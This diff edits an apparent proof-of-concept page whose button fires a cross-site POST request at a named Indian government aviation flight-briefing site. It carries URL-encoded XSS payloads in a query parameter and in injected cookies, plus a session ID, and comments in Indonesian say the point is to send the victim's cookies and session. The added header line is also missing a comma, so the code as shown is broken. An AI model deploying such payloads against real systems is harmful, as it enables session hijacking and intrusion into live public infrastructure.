@@ -10,8 +10,8 @@
 
     <script>
         document.getElementById('exploitBtn').addEventListener('click', function() {
-            var url = 'https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showopmetquery.php';
-            var params = 'icaos=HOLA%22%3E%3E%3C%3C%2Fp%3E%3Cscript%3Ealert(%60XSS%60)%3C%2Fscript%3E&type=taf';
+            var url = 'https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showlogin.php';
+            var params = 'errmsg=';
 
             fetch(url, {
                 method: 'POST',
@@ -19,6 +19,7 @@
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'X-Requested-With': 'XMLHttpRequest' // Header yang DIWAJIBKAN server
+                    'Cookie': 'r_username=%22%3E%3E%3C%3Csvg%2Fonload%3Dalert(1)%3E; r_password=%22%3E%3E%3C%3Csvg%2Fonload%3Dalert(1)%3E; PHPSESSID=ku6v0b1aovcrhvu4ibf2u6vk47'
                 },
                 body: params,
                 credentials: 'include' // PENTING: Untuk mengirim cookies/session korban
